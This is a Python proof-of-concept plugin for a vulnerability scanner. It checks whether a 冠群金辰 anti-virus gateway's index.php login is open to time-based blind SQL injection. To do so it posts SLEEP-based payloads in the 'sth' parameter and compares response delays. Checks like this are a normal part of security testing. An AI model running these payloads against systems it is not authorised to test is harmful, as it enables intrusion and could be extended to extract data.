# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    vuln_id = 'Kill_0001'  # 平台漏洞编号，留空
    name = '冠群金辰防病毒墙网关 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-09-16'  # 漏洞公布时间
    desc = '''
        冠群金辰防病毒墙网关设备 index.php SQL注入漏洞。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '冠群金辰防病毒墙网关'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '69d3d6fe-7927-49aa-bc07-849de724a8ec'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #ref:http://www.wooyun.org/bugs/wooyun-2015-0140977
            hh = hackhttp.hackhttp()
            arg = self.target
            poc = arg + '/index.php?action=relogin&sth=556&nickname=admin&warning=%B5%C7%C2%BC%CA%A7%B0%DC%A3%A1%D3%C3%BB%A7%C3%FB%BB%F2%C3%DC%C2%EB%B4%ED%CE%F3%A3%AC%C7%EB%C1%AA%CF%B5%CF%B5%CD%B3%B9%DC%C0%ED%D4%B1%A3%A1%3Cbr%3ELogin+failed%21+username+or+password+error%2CPlease+contact+system+administrators%21'
            postdata1 = 'nickname=123&pass=123&Submit=%B5%C7%C2%BC%28Submit%29&sth=550%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(1)))EczG)&action=login'
            postdata2 = 'nickname=123&pass=123&Submit=%B5%C7%C2%BC%28Submit%29&sth=550%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))EczG)&action=login'
            timea = time.time()
            code1, head, res, errcode, _ = hh.http(poc,post=postdata1)
            timeaend = time.time() - timea
            timeb = time.time()
            code2, head, res, errcode, _ = hh.http(poc,post=postdata2)
            timebend = time.time() - timeb
            if code1 == 302 and code2 == 302 and timebend - timeaend > 3.5:
                #security_hole(poc+", can be sqli ,ref:http://www.wooyun.org/bugs/wooyun-2015-0140977")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
